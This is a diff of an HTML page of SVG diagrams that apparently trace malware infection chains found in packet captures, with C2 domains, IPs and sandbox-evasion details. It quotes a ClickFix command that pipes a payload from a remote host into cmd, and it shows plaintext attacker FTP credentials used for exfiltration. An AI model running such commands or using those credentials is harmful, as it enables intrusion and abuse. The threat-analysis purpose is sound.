+        <g class="chain-node" onmouseenter="showTip(event,'Sandbox Evasion','ip-api.com — GET /line/?fields=hosting\nhosting=false = real victim!')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
+          <rect x="10" y="188" width="300" height="54" rx="4" fill="#1a0808" stroke="#3d1010" stroke-width="1"/>
+          <rect x="10" y="188" width="4" height="54" rx="2" fill="#ff4757"/>
+          <text x="24" y="210" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">ip-api.com — Sandbox Evasion</text>
+          <text x="24" y="228" font-family="'JetBrains Mono',monospace" font-size="10" fill="#ff4757">hosting=false = real victim confirmed</text>
         </g>
-        <line x1="160" y1="266" x2="160" y2="298" stroke="#ff4757" stroke-width="1" stroke-dasharray="3 3" marker-end="url(#ar7)"/>
-        <text x="308" y="299" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="end">16:13:59+</text>
-        <g class="chain-node" onmouseenter="showTip(event,'Data Collection (on device)','Location: Inside tyler device — not visible in PCAP\nData collected:\n- Browser saved passwords → PW_tyler...html\n- Thunderbird contacts → Contacts_Thunderbird.txt\nEvidence: File names visible in FTP STOR commands\nNote: Collection itself not captured in network traffic')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
-          <rect x="10" y="301" width="300" height="66" rx="4" fill="#0a1a0a" stroke="#1a3d1a" stroke-width="1"/>
-          <rect x="10" y="301" width="4" height="66" rx="2" fill="#2ed573"/>
-          <text x="24" y="323" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">Data Collection — on device</text>
-          <text x="24" y="341" font-family="'JetBrains Mono',monospace" font-size="10" fill="#2ed573">Browser passwords + Thunderbird contacts</text>
-          <text x="24" y="357" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">Not visible in PCAP — inferred from FTP filenames</text>
+        <line x1="160" y1="242" x2="160" y2="274" stroke="#ff4757" stroke-width="1" stroke-dasharray="3 3" marker-end="url(#ar7)"/>
+        <g class="chain-node" onmouseenter="showTip(event,'FTP Exfiltration','ftp.corwineagles.com — 162.241.123.75\nUSER: edunis@corwineagles.com\nPASS: cCycU=91vup7\nSTOR: browser passwords + Thunderbird contacts')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
+          <rect x="10" y="277" width="300" height="66" rx="4" fill="#1a0808" stroke="#ff4757" stroke-width="1.5"/>
+          <rect x="10" y="277" width="4" height="66" rx="2" fill="#ff4757"/>
+          <text x="24" y="299" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">FTP Exfiltration — corwineagles.com</text>
+          <text x="24" y="317" font-family="'JetBrains Mono',monospace" font-size="10" fill="#ff4757">STOR passwords + Thunderbird contacts</text>
+          <text x="24" y="333" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">Plaintext FTP — credentials fully visible</text>
         </g>
-        <line x1="160" y1="367" x2="160" y2="399" stroke="#ff4757" stroke-width="1" stroke-dasharray="3 3" marker-end="url(#ar7)"/>
-        <text x="168" y="388" font-family="'JetBrains Mono',monospace" font-size="9" fill="#ff4757">2 sec →</text>
-        <text x="308" y="400" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="end">16:14:01</text>
-        <g class="chain-node" onmouseenter="showTip(event,'FTP Exfiltration','Server: ftp.corwineagles.com\nIP: 162.241.123.75\nProtocol: FTP (port 21) — UNENCRYPTED!\nCredentials visible in plaintext:\n  USER: edunis@corwineagles.com\n  PASS: cCycU=91vup7\nFiles exfiltrated:\n  STOR PW_tyler-DESKTOP-W7F98GR_2026_02_03_16_13_59.html\n  STOR Contacts_Thunderbird.txt_tyler-...\nNote: corwineagles.com likely compromised legitimate site')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
-          <rect x="10" y="402" width="300" height="80" rx="4" fill="#1a0808" stroke="#ff4757" stroke-width="1.5"/>
-          <rect x="10" y="402" width="4" height="80" rx="2" fill="#ff4757"/>
-          <text x="24" y="424" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">FTP Exfiltration — corwineagles.com</text>
-          <text x="24" y="442" font-family="'JetBrains Mono',monospace" font-size="10" fill="#ff4757">STOR PW_tyler...html + Contacts_Thunderbird.txt</text>
-          <text x="24" y="458" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">USER: edunis [at] corwineagles.com</text>
-          <text x="24" y="472" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">162.241.123.75 — likely compromised site</text>
-        </g>
-        <text x="160" y="510" font-family="'JetBrains Mono',monospace" font-size="9" fill="#8b949e" text-anchor="middle">── ~9 seconds: download → exfiltration ──</text>
-        <rect x="10" y="524" width="10" height="10" fill="#4a5568" rx="1"/><text x="26" y="533" font-family="'JetBrains Mono',monospace" font-size="9" fill="#8b949e">Victim</text>
-        <rect x="80" y="524" width="10" height="10" fill="#ffa502" rx="1"/><text x="96" y="533" font-family="'JetBrains Mono',monospace" font-size="9" fill="#8b949e">Init. vector</text>
-        <rect x="170" y="524" width="10" height="10" fill="#2ed573" rx="1"/><text x="186" y="533" font-family="'JetBrains Mono',monospace" font-size="9" fill="#8b949e">On-device</text>
-        <rect x="250" y="524" width="10" height="10" fill="#ff4757" rx="1"/><text x="266" y="533" font-family="'JetBrains Mono',monospace" font-size="9" fill="#8b949e">C2/Exfil</text>
-        <text x="160" y="560" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="middle">Hover each step for full details</text>
+        <text x="160" y="390" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="middle">Hover each step for full details</text>
       </svg>
     </div>
   </div>
@@ -612,7 +557,7 @@ html,body{max-width:100%;overflow-x:hidden;}
   <div class="chain-panel" id="chain-ex8">
     <div class="chain-info fade-in">
       <h3>KongTuke ClickFix Activity</h3>
-      <p>Multi-stage attack combining ClickFix social engineering with Drive-by download. Victim visited a DGA-generated domain hosting a fake CAPTCHA page. KongTuke deployed automatically, while victim executed a LOLBin (finger.exe) command manually. MintsLoader staged in via obfuscated PowerShell, followed by geo-reconnaissance before GhostWeaver RAT deployment.</p>
+      <p>Multi-stage ClickFix + Drive-by. KongTuke → MintsLoader → GhostWeaver RAT.</p>
       <div class="chain-meta-grid">
         <div class="chain-meta-item"><div class="chain-meta-label">INFECTED HOST</div><div class="chain-meta-val">10.2.2.37</div></div>
         <div class="chain-meta-item"><div class="chain-meta-label">NETWORK</div><div class="chain-meta-val">Workgroup</div></div>
@@ -623,91 +568,53 @@ html,body{max-width:100%;overflow-x:hidden;}
       </div>
     </div>
     <div class="chain-svg-wrap fade-in">
-      <svg width="100%" viewBox="0 0 320 750" style="max-height:800px">
-        <defs>
-          <marker id="am8" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="5" markerHeight="5" orient="auto"><path d="M2 2L8 5L2 8" fill="none" stroke="#253548" stroke-width="1.5" stroke-linecap="round"/></marker>
-          <marker id="ar8" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="5" markerHeight="5" orient="auto"><path d="M2 2L8 5L2 8" fill="none" stroke="#ff4757" stroke-width="1.5" stroke-linecap="round"/></marker>
-          <marker id="ao8" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="5" markerHeight="5" orient="auto"><path d="M2 2L8 5L2 8" fill="none" stroke="#ffa502" stroke-width="1.5" stroke-linecap="round"/></marker>
-        </defs>
-        <text x="308" y="8" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="end">17:49:22</text>
-        <g class="chain-node" onmouseenter="showTip(event,'Victim Workstation','IP: 10.2.2.37\nOS: Windows\nMAC: 00:18:DE:01:84:C3 (Intel)\nNetwork: Workgroup (no AD/DC)\nNo hostname observed in PCAP')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
+      <svg width="100%" viewBox="0 0 320 540" style="max-height:570px">
+        <defs><marker id="ar8" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="5" markerHeight="5" orient="auto"><path d="M2 2L8 5L2 8" fill="none" stroke="#ff4757" stroke-width="1.5" stroke-linecap="round"/></marker><marker id="ao8" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="5" markerHeight="5" orient="auto"><path d="M2 2L8 5L2 8" fill="none" stroke="#ffa502" stroke-width="1.5" stroke-linecap="round"/></marker></defs>
+        <g class="chain-node" onmouseenter="showTip(event,'Victim','10.2.2.37 | Workgroup')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
           <rect x="10" y="10" width="300" height="54" rx="4" fill="#151d27" stroke="#253548" stroke-width="1"/>
           <rect x="10" y="10" width="4" height="54" rx="2" fill="#4a5568"/>
           <text x="24" y="32" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">10.2.2.37 — Windows</text>
           <text x="24" y="50" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">Workgroup | MAC: 00:18:DE:01:84:C3</text>
         </g>
         <line x1="160" y1="64" x2="160" y2="92" stroke="#ffa502" stroke-width="1" stroke-dasharray="3 3" marker-end="url(#ao8)"/>
-        <text x="168" y="82" font-family="'JetBrains Mono',monospace" font-size="9" fill="#ffa502">visits ClickFix page</text>
-        <text x="308" y="95" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="end">17:49:22</text>
-        <g class="chain-node" onmouseenter="showTip(event,'Initial Infection — ClickFix + Drive-by','Domain: oceanbistrooumc.com\nIP: 35.212.49.138 (Google LLC)\nProtocol: HTTPS (TLSv1.3)\nType: DGA-generated domain\nVT: 4/94 Malicious — tag: DGA\nDomain age: 3 months\nAction 1 (automatic): loads soulversr.com (Drive-by)\nAction 2 (social): shows fake CAPTCHA\n= tricks victim into pasting malicious cmd')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
-          <rect x="10" y="97" width="300" height="78" rx="4" fill="#1a1600" stroke="#3d3000" stroke-width="1"/>
-          <rect x="10" y="97" width="4" height="78" rx="2" fill="#ffa502"/>
-          <text x="24" y="118" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">oceanbistrooumc.com — ClickFix Page</text>
-          <text x="24" y="136" font-family="'JetBrains Mono',monospace" font-size="10" fill="#ffa502">35.212.49.138 — DGA domain (3 months old)</text>
-          <text x="24" y="152" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">Dual action: Drive-by + fake CAPTCHA trick</text>
-          <text x="24" y="166" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">VT: 4/94 malicious | tag: DGA</text>
+        <g class="chain-node" onmouseenter="showTip(event,'ClickFix Page','oceanbistrooumc.com — 35.212.49.138\nDGA domain — fake CAPTCHA + Drive-by')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
+          <rect x="10" y="95" width="300" height="54" rx="4" fill="#1a1600" stroke="#3d3000" stroke-width="1"/>
+          <rect x="10" y="95" width="4" height="66" rx="2" fill="#ffa502"/>
+          <text x="24" y="117" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">oceanbistrooumc.com — ClickFix</text>
+          <text x="24" y="135" font-family="'JetBrains Mono',monospace" font-size="10" fill="#ffa502">DGA domain — dual: Drive-by + CAPTCHA</text>
         </g>
-        <line x1="160" y1="175" x2="160" y2="203" stroke="#ff4757" stroke-width="1" stroke-dasharray="3 3" marker-end="url(#ar8)"/>
-        <text x="168" y="193" font-family="'JetBrains Mono',monospace" font-size="9" fill="#ff4757">auto — 2 sec →</text>
-        <text x="308" y="206" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="end">17:49:22–24</text>
-        <g class="chain-node" onmouseenter="showTip(event,'Drive-by Download — KongTuke','Domain: soulversr.com\nIP: 216.245.184.175\nProtocol: HTTPS (TLSv1.3)\nPayload: ~34 KB (2 connections)\nTiming: 2 seconds — automatic (no user action)\nVT: payload_delivery — KongTuke malware\nNote: Triggered automatically by page JavaScript\nKongTuke = Loader for MintsLoader')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
-          <rect x="10" y="208" width="300" height="66" rx="4" fill="#1a0808" stroke="#3d1010" stroke-width="1"/>
-          <rect x="10" y="208" width="4" height="66" rx="2" fill="#ff4757"/>
-          <text x="24" y="230" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">soulversr.com — KongTuke Delivery</text>
-          <text x="24" y="248" font-family="'JetBrains Mono',monospace" font-size="10" fill="#ff4757">216.245.184.175 — Drive-by (~34 KB)</text>
-          <text x="24" y="264" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">VT: KongTuke payload_delivery confirmed</text>
+        <line x1="160" y1="149" x2="160" y2="177" stroke="#ff4757" stroke-width="1" stroke-dasharray="3 3" marker-end="url(#ar8)"/>
+        <g class="chain-node" onmouseenter="showTip(event,'KongTuke Drive-by','soulversr.com — 216.245.184.175\n~34 KB — 2 seconds auto')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
+          <rect x="10" y="180" width="300" height="54" rx="4" fill="#1a0808" stroke="#3d1010" stroke-width="1"/>
+          <rect x="10" y="180" width="4" height="54" rx="2" fill="#ff4757"/>
+          <text x="24" y="202" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">soulversr.com — KongTuke Delivery</text>
+          <text x="24" y="220" font-family="'JetBrains Mono',monospace" font-size="10" fill="#ff4757">Drive-by ~34 KB — ThreatFox confirmed</text>
         </g>
-        <line x1="160" y1="274" x2="160" y2="302" stroke="#ff4757" stroke-width="1" stroke-dasharray="3 3" marker-end="url(#ar8)"/>
-        <text x="168" y="292" font-family="'JetBrains Mono',monospace" font-size="9" fill="#ff4757">42 sec →</text>
-        <text x="308" y="305" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="end">17:50:04</text>
-        <g class="chain-node" onmouseenter="showTip(event,'LOLBin Abuse — finger.exe','IP: 144.31.238.37\nProtocol: FINGER (port 79)\nExecuted by: victim manually (ClickFix trick)\nCommand: copy C:\\WINDOWS\\system32\\finger.exe ...\n  finger captcha@144.31.238.37 | cmd\nTechnique: Living off the Land Binary (LOLBin)\nResult: payload fetched from C2 and piped to cmd\nFileless execution — nothing written to disk')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
-          <rect x="10" y="307" width="300" height="66" rx="4" fill="#1a0808" stroke="#3d1010" stroke-width="1"/>
-          <rect x="10" y="307" width="4" height="66" rx="2" fill="#ff4757"/>
-          <text x="24" y="329" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">144.31.238.37 — LOLBin finger.exe</text>
-          <text x="24" y="347" font-family="'JetBrains Mono',monospace" font-size="10" fill="#ff4757">FINGER protocol — victim ran cmd manually</text>
-          <text x="24" y="363" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">Fileless: payload piped directly to cmd</text>
+        <line x1="160" y1="234" x2="160" y2="262" stroke="#ff4757" stroke-width="1" stroke-dasharray="3 3" marker-end="url(#ar8)"/>
+        <g class="chain-node" onmouseenter="showTip(event,'LOLBin finger.exe','144.31.238.37 — FINGER port 79\nVictim ran ClickFix cmd manually')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
+          <rect x="10" y="265" width="300" height="54" rx="4" fill="#1a0808" stroke="#3d1010" stroke-width="1"/>
+          <rect x="10" y="265" width="4" height="54" rx="2" fill="#ff4757"/>
+          <text x="24" y="287" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">144.31.238.37 — LOLBin finger.exe</text>
+          <text x="24" y="305" font-family="'JetBrains Mono',monospace" font-size="10" fill="#ff4757">Fileless payload piped to cmd</text>
         </g>
-        <line x1="160" y1="373" x2="160" y2="401" stroke="#ff4757" stroke-width="1" stroke-dasharray="3 3" marker-end="url(#ar8)"/>
-        <text x="308" y="404" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="end">17:50:04–10</text>
-        <g class="chain-node" onmouseenter="showTip(event,'C2 Stage 1 — PowerShell Stager','IP: 85.137.253.64 (AS215428 — Mykyta Skorobohatko)\nPort: 3456 (non-standard)\nVT: 5/94 Malicious — Werkzeug/Python C2\nStep 1: GET /o → main.ps1 (12 KB)\nStep 2: POST /m → message=ABCD111+Windows Defender\n  → wgr.ps1 (15 KB) returned\nBoth payloads: heavily obfuscated ASCII char arrays\nCommunity: Second stage malware via PS obfuscation')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
-          <rect x="10" y="406" width="300" height="78" rx="4" fill="#1a0808" stroke="#3d1010" stroke-width="1"/>
-          <rect x="10" y="406" width="4" height="78" rx="2" fill="#ff4757"/>
-          <text x="24" y="427" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">85.137.253.64:3456 — C2 Stage 1</text>
-          <text x="24" y="445" font-family="'JetBrains Mono',monospace" font-size="10" fill="#ff4757">GET /o → main.ps1 | POST /m → wgr.ps1</text>
-          <text x="24" y="461" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">Obfuscated PowerShell — Werkzeug/Python C2</text>
-          <text x="24" y="477" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">Sends: ABCD111 + Windows Defender status</text>
+        <line x1="160" y1="319" x2="160" y2="347" stroke="#ff4757" stroke-width="1" stroke-dasharray="3 3" marker-end="url(#ar8)"/>
+        <g class="chain-node" onmouseenter="showTip(event,'MintsLoader Chain','85.137.253.64:3456 → sbwur1.top → gecdfcjcbcmmakk.top\nGeo-recon: api.ipify.org + ipinfo.io')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
+          <rect x="10" y="350" width="300" height="66" rx="4" fill="#1a0808" stroke="#ff4757" stroke-width="1.5"/>
+          <rect x="10" y="350" width="4" height="66" rx="2" fill="#ff4757"/>
+          <text x="24" y="372" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">MintsLoader + Geo-Reconnaissance</text>
+          <text x="24" y="390" font-family="'JetBrains Mono',monospace" font-size="10" fill="#ff4757">sbwur1.top → gecdfcjcbcmmakk.top</text>
+          <text x="24" y="406" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">Profiling: city + region + country</text>
         </g>
-        <line x1="160" y1="484" x2="160" y2="512" stroke="#ff4757" stroke-width="1" stroke-dasharray="3 3" marker-end="url(#ar8)"/>
-        <text x="308" y="515" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="end">17:50:11–15</text>
-        <g class="chain-node" onmouseenter="showTip(event,'MintsLoader — Staging Chain','Stage 2: sbwur1.top (64.52.80.153:80)\n  GET /1.php?s=63e95be1... → 52 KB payload\n  Server: QWaWQUF8cyFhydXhS\n  VT: MintsLoader (ThreatFox — netresec)\nStage 3: gecdfcjcbcmmakk.top (64.52.80.153:80)\n  GET /9at1biglx5htr.php?id=DESKTOP-HASYZQ7&key=...\n  Victim registration: hostname + key sent\n  Server receives 298 KB obfuscated payload\n  VT: MintsLoader (ThreatFox — netresec)')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
-          <rect x="10" y="517" width="300" height="78" rx="4" fill="#1a0808" stroke="#3d1010" stroke-width="1"/>
-          <rect x="10" y="517" width="4" height="78" rx="2" fill="#ff4757"/>
-          <text x="24" y="538" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">MintsLoader — 2-Stage Chain</text>
-          <text x="24" y="556" font-family="'JetBrains Mono',monospace" font-size="10" fill="#ff4757">sbwur1.top → 52 KB | gecdfcjcbcmmakk.top → 298 KB</text>
-          <text x="24" y="572" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">Victim registration: id=DESKTOP-HASYZQ7</text>
-          <text x="24" y="588" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">ThreatFox: MintsLoader confirmed (netresec)</text>
-        </g>
-        <line x1="160" y1="595" x2="160" y2="620" stroke="#ff4757" stroke-width="1" stroke-dasharray="3 3" marker-end="url(#ar8)"/>
-        <text x="308" y="623" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="end">17:50:23+</text>
-        <g class="chain-node" onmouseenter="showTip(event,'Geo-Reconnaissance','api.ipify.org (104.26.12.205) — x2 contacts\n  Purpose: get victim Public IP address\ncheckip.dyndns.org (132.226.8.169)\n  Purpose: alternative IP check\nipinfo.io (34.117.59.81)\n  GET /173.66.46.112/city\n  GET /173.66.46.112/region\n  GET /173.66.46.112/country\n  Purpose: victim geo-location profiling\nNote: all are legitimate services used by malware\nPreparing for GhostWeaver RAT deployment')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
-          <rect x="10" y="625" width="300" height="66" rx="4" fill="#1a0808" stroke="#ff4757" stroke-width="1.5"/>
-          <rect x="10" y="625" width="4" height="66" rx="2" fill="#ff4757"/>
-          <text x="24" y="647" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">Geo-Reconnaissance</text>
-          <text x="24" y="665" font-family="'JetBrains Mono',monospace" font-size="10" fill="#ff4757">api.ipify.org + checkip.dyndns.org + ipinfo.io</text>
-          <text x="24" y="681" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">Profiling: Public IP + city + region + country</text>
-        </g>
-        <rect x="10" y="700" width="10" height="10" fill="#4a5568" rx="1"/><text x="26" y="709" font-family="'JetBrains Mono',monospace" font-size="9" fill="#8b949e">Victim</text>
-        <rect x="80" y="700" width="10" height="10" fill="#ffa502" rx="1"/><text x="96" y="709" font-family="'JetBrains Mono',monospace" font-size="9" fill="#8b949e">Init. vector</text>
-        <rect x="170" y="700" width="10" height="10" fill="#ff4757" rx="1"/><text x="186" y="709" font-family="'JetBrains Mono',monospace" font-size="9" fill="#8b949e">C2 / Recon</text>
-        <text x="160" y="730" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="middle">Hover each step for full details</text>
+        <text x="160" y="496" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="middle">Hover each step for full details</text>
       </svg>
     </div>
   </div>
-  <!-- EX9 PANEL — Silent Spammer -->
+
+  <!-- EX9 PANEL -->
   <div class="chain-panel" id="chain-ex9">
     <div class="chain-info fade-in">
       <h3>Silent Spammer</h3>
-      <p>SNAKEKEYLOGGER suspected infection on a Workgroup network. Malware performed sandbox evasion, established covert C2 via Telegram Bot API, conducted geographic reconnaissance across three services, then converted the victim machine into a spam bot sending bulk email via an external SMTP server.</p>
+      <p>SNAKEKEYLOGGER suspected. Telegram C2, geo-recon, spam bot via SMTP.</p>
       <div class="chain-meta-grid">
         <div class="chain-meta-item"><div class="chain-meta-label">INFECTED HOST</div><div class="chain-meta-val">10.1.29.101</div></div>
         <div class="chain-meta-item"><div class="chain-meta-label">HOSTNAME</div><div class="chain-meta-val">DESKTOP-WIN11PC</div></div>
@@ -716,75 +623,155 @@ html,body{max-width:100%;overflow-x:hidden;}
         <div class="chain-meta-item"><div class="chain-meta-label">NETWORK TYPE</div><div class="chain-meta-val">Workgroup</div></div>
         <div class="chain-meta-item"><div class="chain-meta-label">VECTOR</div><div class="chain-meta-val">Unknown</div></div>
       </div>
-      <div style="font-family:var(--mono);font-size:10px;color:var(--text2);margin-top:-8px;line-height:1.7;">* Suspected — VT Crowdsourced Intelligence (Cluster25). Confirmation requires endpoint/memory analysis.</div>
     </div>
     <div class="chain-svg-wrap fade-in">
-      <svg width="100%" viewBox="0 0 320 650" style="max-height:690px">
-        <defs>
-          <marker id="am9" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="5" markerHeight="5" orient="auto"><path d="M2 2L8 5L2 8" fill="none" stroke="#253548" stroke-width="1.5" stroke-linecap="round"/></marker>
-          <marker id="ar9" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="5" markerHeight="5" orient="auto"><path d="M2 2L8 5L2 8" fill="none" stroke="#ff4757" stroke-width="1.5" stroke-linecap="round"/></marker>
-        </defs>
-        <text x="308" y="8" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="end">03:03:19Z</text>
-        <g class="chain-node" onmouseenter="showTip(event,'Victim Workstation','IP: 10.1.29.101\nHostname: DESKTOP-WIN11PC\nMAC: 00:08:02:1C:47:AE (Hewlett Packard)\nOS: Windows\nPublic IP: 173.166.146.112 (Comcast AS7922)\nGateway: 10.1.29.1 (NETGEAR)\nNetwork: Workgroup (no AD/DC)')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
+      <svg width="100%" viewBox="0 0 320 490" style="max-height:520px">
+        <defs><marker id="ar9" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="5" markerHeight="5" orient="auto"><path d="M2 2L8 5L2 8" fill="none" stroke="#ff4757" stroke-width="1.5" stroke-linecap="round"/></marker></defs>
+        <g class="chain-node" onmouseenter="showTip(event,'Victim','DESKTOP-WIN11PC — 10.1.29.101\nPublic IP: 173.166.146.112')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
           <rect x="10" y="10" width="300" height="54" rx="4" fill="#151d27" stroke="#253548" stroke-width="1"/>
           <rect x="10" y="10" width="4" height="54" rx="2" fill="#4a5568"/>
           <text x="24" y="32" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">DESKTOP-WIN11PC</text>
-          <text x="24" y="50" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">10.1.29.101 | Workgroup (no domain)</text>
+          <text x="24" y="50" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">10.1.29.101 | Workgroup</text>
         </g>
-        <line x1="160" y1="64" x2="160" y2="92" stroke="#253548" stroke-width="1" stroke-dasharray="3 3" marker-end="url(#am9)"/>
-        <text x="308" y="95" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="end">unknown</text>
-        <g class="chain-node" onmouseenter="showTip(event,'Initial Infection Vector','Status: UNKNOWN\nReason: Malware already active at capture start\nNo download or exploit traffic in PCAP\nEndpoint forensics required to determine delivery')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
-          <rect x="10" y="97" width="300" height="54" rx="4" fill="#111820" stroke="#253548" stroke-width="1" stroke-dasharray="4 3"/>
-          <rect x="10" y="97" width="4" height="54" rx="2" fill="#4a5568"/>
-          <text x="24" y="119" font-family="'JetBrains Mono',monospace" font-size="11" fill="#8b949e" font-weight="500">Initial infection vector</text>
-          <text x="24" y="137" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">Unknown — outside PCAP capture window</text>
+        <line x1="160" y1="64" x2="160" y2="92" stroke="#ff4757" stroke-width="1" stroke-dasharray="3 3" marker-end="url(#ar9)"/>
+        <g class="chain-node" onmouseenter="showTip(event,'Sandbox Evasion','ip-api.com — GET /json/\nhosting=false = real victim! T1497')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
+          <rect x="10" y="95" width="300" height="54" rx="4" fill="#1a0808" stroke="#3d1010" stroke-width="1"/>
+          <rect x="10" y="95" width="4" height="54" rx="2" fill="#ff4757"/>
+          <text x="24" y="117" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">ip-api.com — Sandbox Evasion</text>
+          <text x="24" y="135" font-family="'JetBrains Mono',monospace" font-size="10" fill="#ff4757">hosting=false → attack continues</text>
         </g>
-        <line x1="160" y1="151" x2="160" y2="179" stroke="#ff4757" stroke-width="1" stroke-dasharray="3 3" marker-end="url(#ar9)"/>
-        <text x="308" y="182" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="end">03:03:19Z</text>
-        <g class="chain-node" onmouseenter="showTip(event,'Sandbox Evasion — ip-api.com','Domain: ip-api.com\nIP: 208.95.112.1\nProtocol: HTTP (port 80) — unencrypted\nRequest: GET /json/\nPurpose: detect sandbox or datacenter environment\nResponse: hosting=false = real victim confirmed!\nResult: malware continues full execution\nTechnique: T1497 — Sandbox Evasion')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
-          <rect x="10" y="184" width="300" height="66" rx="4" fill="#1a0808" stroke="#3d1010" stroke-width="1"/>
-          <rect x="10" y="184" width="4" height="66" rx="2" fill="#ff4757"/>
-          <text x="24" y="206" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">ip-api.com — Sandbox Evasion</text>
-          <text x="24" y="224" font-family="'JetBrains Mono',monospace" font-size="10" fill="#ff4757">GET /json/ → hosting=false = real victim!</text>
-          <text x="24" y="240" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">T1497 — attack continues on confirmed target</text>
+        <line x1="160" y1="149" x2="160" y2="177" stroke="#ff4757" stroke-width="1" stroke-dasharray="3 3" marker-end="url(#ar9)"/>
+        <g class="chain-node" onmouseenter="showTip(event,'Telegram C2','api.telegram.org — 149.154.166.110\nTLSv1.3 — SNAKEKEYLOGGER (Cluster25)')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
+          <rect x="10" y="180" width="300" height="54" rx="4" fill="#1a0808" stroke="#3d1010" stroke-width="1"/>
+          <rect x="10" y="180" width="4" height="54" rx="2" fill="#ff4757"/>
+          <text x="24" y="202" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">api.telegram.org — C2 Channel</text>
+          <text x="24" y="220" font-family="'JetBrains Mono',monospace" font-size="10" fill="#ff4757">TLSv1.3 — SNAKEKEYLOGGER confirmed</text>
         </g>
-        <line x1="160" y1="250" x2="160" y2="278" stroke="#ff4757" stroke-width="1" stroke-dasharray="3 3" marker-end="url(#ar9)"/>
-        <text x="308" y="281" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="end">03:03:19Z</text>
